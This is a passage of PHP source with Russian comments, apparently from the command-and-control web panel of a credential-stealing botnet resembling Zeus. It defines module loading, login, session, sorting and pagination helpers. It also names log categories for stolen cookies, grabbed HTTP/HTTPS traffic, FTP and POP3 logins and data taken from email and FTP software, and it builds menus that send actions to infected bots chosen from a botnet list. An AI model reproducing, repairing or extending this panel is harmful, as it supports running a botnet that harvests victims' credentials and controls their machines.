define('FORM_CURRENT_MODULE', str_replace(array('{NAME}', '{VALUE}'), array('m', $curModule), THEME_FORM_VALUE)); //Параметр текущего модуля для формы.
define('QUERY_STRING',        QUERY_STRING_BLANK.CURRENT_MODULE);      //Строка запроса для текущего модуля.
define('QUERY_STRING_HTML',   QUERY_STRING_BLANK_HTML.CURRENT_MODULE); //Строка запроса для текущего модуля в HTML формате.
unset($neededModule, $curModule);

//Загрузка языка модуля.
if(!file_exists('system/'.CURRENT_MODULE.'.lng.'.$userData['language'].'.php'))$userData['language'] = DEFAULT_LANGUAGE;
require_once('system/'.CURRENT_MODULE.'.lng.'.$userData['language'].'.php'); 

//Запуск модуля.
require_once('system/'.CURRENT_MODULE.'.php'); 
die();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Получение ошибки MySQL с формотированием HTML и префиксом.
  
  Return - string, ошибка MySQL.
*/
function mysqlErrorEx()
{
  return 'MySQL error: '.htmlEntitiesEx(mysql_error());
}

/*
  Создание временного файла.
  
  IN $prefix - string, префикс файла.
  
  Return     - mixed, имя нового временного файла или false в случае неудачи.
*/
function createTempFile($prefix)
{
  @mkdir('tmp', 0777);
  return @tempnam('tmp', $prefix);
}

/*
  Добавление заголовков для загрузки данных в виде файла.
  
  IN $name - string, конечное имя файла.
  IN $size - размер файла.
*/
function httpDownloadHeaders($name, $size)
{
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename='.baseNameEx($name));
  header('Content-Transfer-Encoding: binary');
  header('Content-Length: '.$size);
  httpNoCacheHeaders();
}

/*
  Преобразование BLT_* в строку.
  
  IN $type - int, BLT_* для преобразование.
  
  Return   - string, строкове представление BLT_*.
*/
function bltToLng($type) 
{
  switch($type)
  {
    case BLT_COOKIES:               return LNG_BLT_COOKIES;
    case BLT_FILE:                  return LNG_BLT_FILE;
    case BLT_HTTP_REQUEST:          return LNG_BLT_HTTP_REQUEST;
    case BLT_HTTPS_REQUEST:         return LNG_BLT_HTTPS_REQUEST;
    case BLT_LOGIN_FTP:             return LNG_BLT_LOGIN_FTP;
    case BLT_LOGIN_POP3:            return LNG_BLT_LOGIN_POP3;
    case BLT_GRABBED_UI:            return LNG_BLT_GRABBED_UI;
    case BLT_GRABBED_HTTP:          return LNG_BLT_GRABBED_HTTP;
    case BLT_GRABBED_WSOCKET:       return LNG_BLT_GRABBED_WSOCKET;
    case BLT_GRABBED_FTPSOFTWARE:   return LNG_BLT_GRABBED_FTPSOFTWARE;
    case BLT_GRABBED_EMAILSOFTWARE: return LNG_BLT_GRABBED_EMAILSOFTWARE;
    case BLT_GRABBED_OTHER:         return LNG_BLT_GRABBED_OTHER;
  }
  return LNG_BLT_UNKNOWN;
}

/*
  Определяет сущетвуют ли, пробельные символы в строке.
  
  IN $str - string, строка для проверки.
  
  Return  - true - если пробельные символы сущетвуют,
            false - если пробельные символы не сущетвуют.
*/
function spaceCharsExist($str)
{
  return strpbrk($str, "\x20\x09\x0A\x0B\x0D") === false ? false : true;
}

/*
  Преобразование логического выражения в массив.
  
  IN $exp - string, выражение.
  
  Return  - array, результат.
*/
function expressionToArray($exp)
{
  $list = array();
  $len = strlen($exp);
  
  for($i = 0; $i < $len; $i++)
  {
    $cur = ord($exp[$i]);
    
    //Пропускаем пробелные символы.
    if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD))continue;
        
    //Проверяем ковычку.
    if($cur == 0x22 || $cur == 0x27)
    {
      for($j = $i + 1; $j < $len; $j++)if(ord($exp[$j]) == $cur)
      {
        //Подсчитываем количество слешей.
        $c = 0;
        for($k = $j - 1; ord($exp[$k]) == 0x5C; $k--)$c++;
        if($c % 2 == 0)break; //При четном количестве слешей до ковычки, наша ковычка это не спец. символ.
      }
      if($j != $len)$i++; //Если не достигнут конец, убираем первую ковычку.
      
      $type = 1;
    }
    //Простое копирование до первого пробела.
    else
    {
      for($j = $i + 1; $j < $len; $j++)
      {
        $cur = ord($exp[$j]);
        if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD))break;
      }
      
      $type = 0;
    }

    $list[] = array(substr($exp, $i, $j - $i), $type);
    $i = $j;
  }
  
  return $list;
}

/*
  Сравнение строки с логическим выражением.
  
  IN $str    - string, строка.
  IN $exp    - string, выражение.
  IN $cs     - bool, если true, то учетом регистра(BINARY), иначе без учета регистра.
  IN $strong - bool, см. код. 
  
  Return     - true - если строка подходит для выражения,
               false  - в противном случаи.
*/

function matchStringInExpression($str, $exp, $cs, $strong)
{
  $exp = trim($exp);
  if($exp == '' || $exp == '*')return true;
  
  $list = expressionToArray($exp);
  
  //Настройка pcre.
  $pcrePrefix  = ($strong ? '#^' : '#');
  $pcrePostfix = ($strong ? '$#' : '#').($cs ? 'u' : 'iu');

  //Обрабатыаем результат.
  $qPrev = $q_cur = 0;
  $retVal = false;
  
  foreach($list as $item)
  {
    if($item[1] == 0)
    {
      $skip = 0;
      if(strcmp($item[0],       'OR') === 0)$q_cur = 0;
      else if(strcmp($item[0], 'AND') === 0)$q_cur = 1;
      else if(strcmp($item[0], 'NOT') === 0)$q_cur = 2;
      else $skip = 1;
      if($skip == 0){$qPrev = $q_cur; continue;}
    }
    
    //Сравниваем.
    $r = preg_match($pcrePrefix.strtr(preg_quote($item[0], '#'), array('\\*' => '.*', '\\?' => '.?')).$pcrePostfix, $str);
    
    //Не уверен за логику.
    switch($q_cur)
    {
      case 0: //OR
        if($r > 0)$retVal = true;
        break;
      
      case 1: //AND
        if($r > 0)break;
        return false;
      
      case 2: //NOT
        if($r > 0)return false;
        break;
    }
  }
  
  return $retVal;
}

/*
  Преобразование логическим выражения в SQL запрос для WHERE.
  
  IN $exp    - string, выражение.
  IN $column - string, название столбца.
  IN $cs     - bool, если true, то учетом регистра, иначе без учета регистра.
  IN $strong - bool, см. код. 
  
  Return     - string, запрос.
*/
function expressionToSql($exp, $column, $cs, $strong)
{
  $exp = trim($exp);
  if($exp == '' || $exp == '*')return '';
  
  $list = expressionToArray($exp);
  
  //Обрабатыаем результат.
  $query  = '';
  $qPrev = $q_cur = ' OR ';
  $qAddv = ' ';

  foreach($list as $item)
  {
    if($item[1] == 0)
    {
      $skip = 0;
      if(strcmp($item[0], 'OR') === 0)      {$q_cur = ' OR ';  $qAddv = ' ';}
      else if(strcmp($item[0], 'AND') === 0){$q_cur = ' AND '; $qAddv = ' ';}
      else if(strcmp($item[0], 'NOT') === 0){$q_cur = ' AND '; $qAddv = ' NOT ';}
      else $skip = 1;
      
      if($skip == 0)
      {
        if($q_cur != $qPrev && !empty($query))$query = '('.$query.')';
        $qPrev = $q_cur;
        continue;
      }
    }
    
    $s = str_replace(array('%', '_'), array('\\\\%', '\\\\_'), $item[0]);
    
    //Подменяем симолы *, ?.
    $len = strlen($s);
    for($i = 0; $i < $len; $i++)if(($c = ord($s[$i])) == 0x2A || $c == 0x3F)
    {
      //Подсчитываем количество слешей.
      $cc = 0;
      for($k = $i - 1; $k >= 0 && ord($s[$k]) == 0x5C; $k--)$cc++;
      
      //Подменяем.
      if($cc % 2 == 0)$s[$i] = $c == 0x2A ? '%' : '_';
    }
    
    $s = stripslashes($s);
    if(!$strong)$s = '%'.$s.'%';
    $query .= (empty($query) ? '' : $q_cur).$column.$qAddv.'LIKE'.($cs ? ' BINARY' : '').' \''.addslashes($s).'\'';
  }
  
  return '('.$query.')';
}

/*
  Проверяет, является ли путь безопасным (отсутвие символов '\', '/', '\0').
  
  IN $str -  string, строка для проверки.
  
  Return  - bool, true - если пусть безопасный, false - если путь не безопасный.
*/
function safePath($str)
{
  return (strpos($str, "/") === false && strpos($str, "\\") === false && strpos($str, "\0") === false);
}

/*
  Вывод форму логина.
  
  IN $showError - bool, выводить ли сообшение о неверном имени/пароле.
*/
function showLoginForm($showError)
{
  $page  = $showError ? THEME_STRING_FORM_ERROR_1_BEGIN.'Bad user name or password.'.THEME_STRING_FORM_ERROR_1_END : '';
  $page .= 
  str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('login', QUERY_STRING_BLANK_HTML.'login', ''), THEME_FORMPOST_BEGIN).
  str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, 'Login'), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', 'User name:', THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array('', 'user', '255', '200px'), THEME_DIALOG_ITEM_INPUT_TEXT).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', 'Password:', THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array('', 'pass', '255', '200px'), THEME_DIALOG_ITEM_INPUT_PASS).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          THEME_DIALOG_ITEM_EMPTY.
          str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'remember', '', 'Remember (MD5 cookies)'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END.
    str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array('Submit', ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
    THEME_DIALOG_ACTIONLIST_END.
  THEME_DIALOG_END;
  
  themeSmall('login', $page.THEME_FORMPOST_END, 0, 0, 0);
}

/*
  Создание списка доступных ботнетов в THEME_DIALOG_ITEM_LISTBOX.
  
  IN $currentBotnet - string, имя текущего ботнета или '', если ботнет не определен.
  IN $advQuery      - дополнительные данные в HTTP-запросе смены ботнета.
  
  Return            - string, ListBox с именем 'botnet' и кнопкой смены ботнета.
*/
function botnetsToListBox($currentBotnet, $advQuery)
{
  $advQuery = htmlEntitiesEx($advQuery);
  $botnets = str_replace(array('{NAME}', '{WIDTH}'), array('botnet', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).str_replace(array('{VALUE}', '{TEXT}'), array('', LNG_BOTNET_ALL), THEME_DIALOG_ITEM_LISTBOX_ITEM);
  if(($r = mysqlQueryEx('botnet_list', 'SELECT DISTINCT `botnet` FROM `botnet_list`')))while(($m = @mysql_fetch_row($r)))if($m[0] != '')
  {
    $botnets .= str_replace(array('{VALUE}',        '{TEXT}'),
                            array(htmlEntitiesEx(urlencode($m[0])), htmlEntitiesEx(mb_substr($m[0], 0, BOTNET_MAX_CHARS))),
                            strcmp($currentBotnet, $m[0]) === 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM);
  }
  $botnets .= 
  THEME_DIALOG_ITEM_LISTBOX_END.THEME_STRING_SPACE.
  str_replace(array('{TEXT}',               '{JS_EVENTS}'),
              array(LNG_BOTNET_APPLY, ' onclick="var botnet = document.getElementById(\'botnet\'); window.location=\''.QUERY_STRING_HTML.$advQuery.'&amp;botnet=\' + botnet.options[botnet.selectedIndex].value;"'),
              THEME_DIALOG_ITEM_ACTION);
  return $botnets;
}

/*
  Создание таблицы со списокм номеров страниц.
  
  IN $totalPages   - int, количетсво страниц.
  IN $currentPage  - int, текущая страница.
  IN $js            - string, JavaScript для события onclick, где {P} - номер страницы.
  
  Return            - string, список страниц.
*/
function showPageList($totalPages, $currentPage, $js)
{
  $list          = array();
  $visiblePages = 5; //Радиус видимых страниц.
  
  //Подсчитываем видимые страницы.
  $minVisible   = $currentPage - $visiblePages;
  $maxVisible   = $currentPage + $visiblePages;
  
  if($minVisible < 1)                $maxVisible -= $minVisible - 1;              //!Увеличиваем на чисило <1
  else if($maxVisible > $totalPages)$minVisible -= ($maxVisible - $totalPages); //Уменьшаем на число вышедшее за $totalPages.
  
  $qMin = false;
  $qMax = false;
  
  for($i = 1; $i <= $totalPages; $i++)
  {
    //Текщая страница.
    if($i == $currentPage)$list[] = array($i, 0);
    else
    {
      //Невидимые страницы.
      if($i != 1 && $i != $totalPages && ($i < $minVisible || $i > $maxVisible))
      {
        if($i < $minVisible && $qMin == false)
        {
          $list[] = array(0, 0);
          $qMin = true;
        }
        else if($i > $maxVisible && $qMax == false)
        {
          $list[] = array(0, 0);
          $qMax = true;
        }
      }
      //Видимые страницы.
      else $list[] = array($i, str_replace('{P}', $i, $js));
    }
  }
  
  return themePageList($list,
                       $currentPage > 1           ? str_replace('{P}', 1,                $js) : 0,
                       $currentPage > 1           ? str_replace('{P}', $currentPage - 1, $js) : 0,
                       $currentPage < $totalPages ? str_replace('{P}', $totalPages,      $js) : 0,
                       $currentPage < $totalPages ? str_replace('{P}', $currentPage + 1, $js) : 0
                      );
}

/*
  Создание пунктов меню для JavaScript из $botMenu.
  
  IN $name - string, имя меню.
  
  Return   - string, переменная JavaScript с соедржимым меню.
*/
function getBotJsMenu($name)
{
  $output = '';
  $i = 0;
  
  foreach($GLOBALS['botMenu'] as &$item)
  {
    if($i++ != 0)$output .= ', ';
    if($item[0] === 0)$output .= '[0]';
    else $output .= '[\''.addJsSlashes(htmlEntitiesEx($item[1])).'\', \''.addJsSlashes(QUERY_SCRIPT_HTML.'?botsaction='.htmlEntitiesEx(urlencode($item[0])).'&amp;bots[]=$0$').'\']';
  }
  
  return 'var '.$name.' = ['.$output.'];';
}

/*
  Создание попап меню для бота.
  
  IN $botId    - string, бот ID. Применять htmlEntitiesEx или urlencode нельзя.
  IN $menuName - string, название меню. Проще говоря имя перменной в JavaScript созданной через getBotJsMenu.
  
  Return    - string, попап меню
*/

function botPopupMenu($botId, $menuName)
{
  if(!isset($GLOBALS['_next_bot_popupmenu__']))$GLOBALS['_next_bot_popupmenu__'] = 100;
  return str_replace(array('{ID}',                              '{MENU_NAME}', '{BOTID_FOR_URL}',                  '{BOTID}'),
                     array($GLOBALS['_next_bot_popupmenu__']++, $menuName,     htmlEntitiesEx(urlencode($botId)), htmlEntitiesEx($botId)),
                     THEME_POPUPMENU_BOT);
}

/*
  Создние заголовка колонки, полежащей сортировке.
  
  IN $text     - string, название колонки.
  IN $columnId - int, ID колонки.
  IN $num      - bool, true - колонка служит для вывода чисел, false - колонка служит для вывода текста.
  
  Retrurn      - string, колонка.
*/
function writeSortColumn($text, $columnId, $num)
{
  if($num)$theme = $GLOBALS['_sortColumnId'] == $columnId ? ($GLOBALS['_sortOrder'] == 0 ? THEME_LIST_HEADER_R_SORT_CUR_ASC : THEME_LIST_HEADER_R_SORT_CUR_DESC) : THEME_LIST_HEADER_R_SORT;
  else    $theme = $GLOBALS['_sortColumnId'] == $columnId ? ($GLOBALS['_sortOrder'] == 0 ? THEME_LIST_HEADER_L_SORT_CUR_ASC : THEME_LIST_HEADER_L_SORT_CUR_DESC) : THEME_LIST_HEADER_L_SORT;
  
  return str_replace(
                     array('{COLUMNS_COUNT}', '{URL}', '{JS_EVENTS}', '{TEXT}', '{WIDTH}'),
                     array(1,                 '#',     ' onclick="return setSortMode('.$columnId.', '.($GLOBALS['_sortColumnId'] == $columnId ? ($GLOBALS['_sortOrder'] == 0 ? 1 : 0) : $GLOBALS['_sortOrder']).')"',  $text, 'auto'),
                     $theme
                    );
}

/*
  JS код для смены сортировки.
  
  IN $url - string, url.
  
  Retutn - string, js-код.
*/
function jsSetSortMode($url)
{
  return "function setSortMode(mode, ord){window.location='{$url}&smode=' + mode +'&sord=' + ord; return false;}\r\n";
}

/*
  Код для JS для инициализации XMLHttpRequest.
  
  IN $var - string, название перменной для объекта.
  
  Retutn - string, js-код.
*/
function jsXmlHttpRequest($var)
{
  return 
  "try{{$var} = new ActiveXObject('Msxml2.XMLHTTP');}".
  "catch(e1)".
  "{".
    "try{{$var} = new ActiveXObject('Microsoft.XMLHTTP');}".
    "catch(e2){{$var} = false;}".
  "}".
  "if(!{$var} && typeof XMLHttpRequest != 'undefined'){{$var} = new XMLHttpRequest();}".
  "if(!{$var})alert('ERROR: Failed to create XMLHttpRequest.');";
}

/*
  JS код для массового управления метакми типа checkbox.
  
  IN $form - string, название формы для обработки.
  IN $cb   - string, главный checkbox.
  IN $cb   - string, название зависимых checkbox'ов.
  
  Retutn - string, js-код.
*/
function jsCheckAll($form, $cb, $arr)
{
  return 
  "function checkAll(){".
  "var bl = document.forms.namedItem('{$form}').elements;".
  "var ns = bl.namedItem('{$cb}').checked;".
  "for(var i = 0; i < bl.length; i++)if(bl.item(i).name == '{$arr}')bl.item(i).checked = ns;".
  "}\r\n";
}

/*
  Получает режим сортировки из GET-запроса.
  
  IN $sm - array, список досутпных сортировок.
  
  Return - string, коцовка URL для текущей стортировки.
*/
function assocateSortMode($sm)
{
  $GLOBALS['_sortColumn']    = $sm[0]; //Колонка
  $GLOBALS['_sortColumnId'] = 0; //ID колонки.
  $GLOBALS['_sortOrder']     = 0; //Направление, 0 = ASC, 1 = DESC

  if(!empty($_GET['smode']) && is_numeric($_GET['smode']))
  {
    if(isset($sm[$_GET['smode']]))
    {
      $GLOBALS['_sortColumn']    = $sm[$_GET['smode']];
      $GLOBALS['_sortColumnId'] = intval($_GET['smode']);
    }
  }

  if(!empty($_GET['sord']) && is_numeric($_GET['sord']))$GLOBALS['_sortOrder'] = $_GET['sord'] == 1 ? 1 : 0;

  if($GLOBALS['_sortColumnId'] !== 0 || $GLOBALS['_sortOrder'] !== 0)return '&smode='.$GLOBALS['_sortColumnId'].'&sord='.$GLOBALS['_sortOrder'];
  return '';
}

/*
  Добавление данных текущей сортировки в форму.
*/
function addSortModeToForm()
{
  return str_replace(array('{NAME}', '{VALUE}'), array('smode', $GLOBALS['_sortColumnId']), THEME_FORM_VALUE).
         str_replace(array('{NAME}', '{VALUE}'), array('sord',  $GLOBALS['_sortOrder']),    THEME_FORM_VALUE);
}

/*
  Получение списка всех директорий.
  
  IN $path - string, путь для поиска.
  
  Return   - array, список диреторий,
             или false в случаи ошибки.
*/
function getDirs($path)
{
  $r = array();
  if(($dh = @opendir($path)) === false)return false;
  else
  {
    while(($file = @readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0 && @is_dir($path.'/'.$file))$r[] = $file;
    @closedir($dh);
  }
  
  return $r;
}

/*
  Удаление файлов и папок.
  
  IN $path - string, полный путь.
  
  Return   - true - если путь успешно удален,
             false - в случаи ошибки.
*/
function clearPath($path)
{
  @chmod($path, 0777);
  
  if(@is_dir($path))
  {
    if(($dh = @opendir($path)) !== false)
    {
      while(($file = readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0)
      {
        if(!clearPath($path.'/'.$file))return false;
      }
      @closedir($dh);
    }
    if(!@rmdir($path))return false;
  }
  else if(is_file($path))
  {
    if(!@unlink($path))return false;
  }
  
  return true;
}

/*
  Отимизирует меню, удаляя из него запрешенные пункты.
  
  IN OUT $menu - array, меню для обработки.
  IN $saveFSep - bool, сохранить верхнии разделители.
*/
function optimizeMenu(&$menu, $saveFSep)
{
  foreach($menu as $key => $item)foreach($item[2] as $r)if(empty($GLOBALS['userData'][$r])){unset($menu[$key]); break;}

  //Удаляем лишнии разделители.
  $sep = -1;
  $i = 0;
  foreach($menu as $key => $item)
  {
    if($item[0] === 0)
    {
      if($i == 0 && !$saveFSep)unset($menu[$key]);
      else if($sep !== -1)unset($menu[$sep]);
      $sep = $key;
    }
    else
    {
      $sep = -1;
      $i++;
    }
  }
  
  if($sep !== -1)unset($menu[$sep]);
}

/*
  Преоброзование бинарного IP в текстовый.
  
  IN $ip - string, бинарный IP.
  
  Return - string, текстовый IP.
*/
function binaryIpToString($ip)
{
  $ip = @unpack('N', $ip);
  return @long2ip($ip[1]);
}

//////////////////////////////////////////////////////////////////////////////////////////////////
// Управление сессией.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Захват сессии
*/
function lockSession()
{
  if($GLOBALS['_sessionRef'] == 0)
  {
    @session_set_cookie_params(SESSION_LIVETIME, CP_HTTP_ROOT);
    @session_name(COOKIE_SESSION);
    @session_start();
  }
  $GLOBALS['_sessionRef']++;
}

/*
  Освобождение сессии
*/
function unlockSession()
{
  if($GLOBALS['_sessionRef'] > 0 && --$GLOBALS['_sessionRef'] == 0)session_write_close();
}

/*
  Уничтожение сессии
*/
function unlockSessionAndDestroyAllCokies()
{
  $GLOBALS['_sessionRef'] = 0;
  if(isset($_SESSION))foreach($_SESSION as $k => $v)unset($_SESSION[$k]);
  @session_unset();
  @session_destroy();
  
  @setcookie(COOKIE_SESSION, '', 0, CP_HTTP_ROOT);
  @setcookie(COOKIE_USER,    '', 0, CP_HTTP_ROOT);
  @setcookie(COOKIE_PASS,    '', 0, CP_HTTP_ROOT);
}
?>